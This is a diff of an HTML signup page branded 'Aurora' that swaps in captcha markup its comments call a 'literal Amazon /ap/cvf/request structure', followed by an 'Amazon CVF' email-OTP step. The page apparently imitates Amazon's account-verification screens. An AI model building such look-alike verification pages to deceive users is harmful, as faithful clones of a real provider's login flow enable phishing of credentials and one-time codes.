@@ -165,10 +165,33 @@
         <p class="legal">Ao criar uma conta, você concorda com os <a href="#">Termos de Uso</a> e o <a href="#">Aviso de Privacidade</a> da Aurora.</p>
       </section>
 
-      <!-- ===== STEP 4: AWS WAF CAPTCHA hosted in an iframe (like the official site) ===== -->
-      <section class="card hidden center-card" data-screen="4">
-        <iframe id="aws-waf-captcha" title="AWS WAF Captcha" name="aws-waf-captcha"
-                src="captcha.html" class="captcha-frame" scrolling="no"></iframe>
+      <!-- ===== STEP 4: Arkose (aacb) captcha — literal Amazon /ap/cvf/request structure ===== -->
+      <section class="card hidden" data-screen="4">
+        <div class="a-section a-text-center">
+          <div class="a-row a-spacing-none aacb-overflow-hidden">
+            <div class="a-box"><div class="a-box-inner a-padding-extra-large">
+              <div class="a-row a-spacing-mini">
+                <h1 id="aacb-captcha-header">Solve this puzzle to protect your account</h1>
+              </div>
+              <div class="a-row a-spacing-base">
+                <div id="aacb-arkose-elements" class="a-column a-span12 a-text-center" style="height: 290px;">
+                  <div class="a-column a-span12 a-text-center">
+                    <span id="aacb-arkose-spinner" class="a-spinner a-spinner-medium" style="display: none;"></span>
+                  </div>
+                  <iframe id="aacb-arkose-frame" class="aacb-captcha-iframe" frameborder="0" scrolling="no"
+                          sandbox="allow-scripts allow-same-origin allow-forms"
+                          src="captcha.html" title="Challenge Verification"
+                          style="width: 302px; height: 290px;"></iframe>
+                </div>
+              </div>
+              <div class="a-row a-spacing-mini">
+                <div class="a-section a-text-left">
+                  <a class="a-link-normal" id="aa_arkose_customer_support_link" href="#">Need help?</a>
+                </div>
+              </div>
+            </div></div>
+          </div>
+        </div>
       </section>
 
       <!-- ===== STEP 6: verify email OTP (Amazon CVF) ===== -->
